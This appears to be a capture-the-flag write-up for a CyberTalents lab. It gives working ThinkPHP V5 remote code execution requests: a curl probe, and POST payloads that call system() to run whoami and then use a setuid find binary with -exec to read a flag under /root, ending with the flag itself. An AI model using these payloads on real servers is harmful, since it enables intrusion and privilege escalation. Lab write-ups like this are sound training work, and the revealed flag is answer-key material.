# Thonk

---

<img width="1909" height="910" alt="image" src="https://github.com/user-attachments/assets/209aa39d-65b8-4cc5-b2c5-7d4602d14053" />

### search on [ThinkPHP V5](https://www.exploit-db.com/exploits/46150)

<img width="1345" height="513" alt="image" src="https://github.com/user-attachments/assets/03139673-f636-4e62-b33d-e24dc5df5d20" />

```
curl -s "http://cdcamol2z7oimz50gmdvww87a1v58873o8mombwzy-web.cybertalentslabs.com/?s=index/\\think\\module/action/param1/\${@print(THINK_VERSION)}"
```

<img width="1345" height="513" alt="image" src="https://github.com/user-attachments/assets/4143b5f8-5c75-4650-acb6-ce4dd4de7b1f" />

<img width="1371" height="299" alt="image" src="https://github.com/user-attachments/assets/666f45a3-f559-4130-833f-b0e46f2b1e78" />

```
POST /index.php?s=captcha HTTP/1.1
Host: cdcamol2z7oimz50gmdvww87a1v58873o8mombwzy-web.cybertalentslabs.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: [CALCULATE_BASED_ON_DATA]
Upgrade-Insecure-Requests: 1

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami
```

<img width="1441" height="336" alt="image" src="https://github.com/user-attachments/assets/1a025260-5232-496d-a189-4b047ff11265" />

----

<img width="1507" height="424" alt="image" src="https://github.com/user-attachments/assets/291f9353-da50-4f23-9feb-447471d0447c" />

```
POST /index.php?s=captcha HTTP/1.1

Host: cdcamol2z7oimz50gmdvww87a1v58873o8mombwzy-web.cybertalentslabs.com

Content-Type: application/x-www-form-urlencoded

Content-Length: 101

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=/home/max/find /root -name flag
```

<img width="1518" height="423" alt="image" src="https://github.com/user-attachments/assets/95c437b9-7a76-470d-a779-ab4baaae4b71" />

```
POST /index.php?s=captcha HTTP/1.1

Host: cdcamol2z7oimz50gmdvww87a1v58873o8mombwzy-web.cybertalentslabs.com

Content-Type: application/x-www-form-urlencoded

Content-Length: 118

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=/home/max/find /root -name flag -exec more {} \;
```

<img width="1519" height="602" alt="image" src="https://github.com/user-attachments/assets/d8d60d43-5c81-458a-90b8-bdfdb3809e91" />

# **`or`**

```
POST /index.php?s=captcha HTTP/1.1

Host: cdcamol2z7oimz50gmdvww87a1v58873o8mombwzy-web.cybertalentslabs.com

Content-Type: application/x-www-form-urlencoded

Content-Length: 118

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=/home/max/find /root -name flag -exec strings {} \;
```

<img width="1476" height="373" alt="image" src="https://github.com/user-attachments/assets/3b665d49-3157-413f-8cc4-929fa5efe094" />

```
FLAG{what_ar3_th3_f1nds}
```

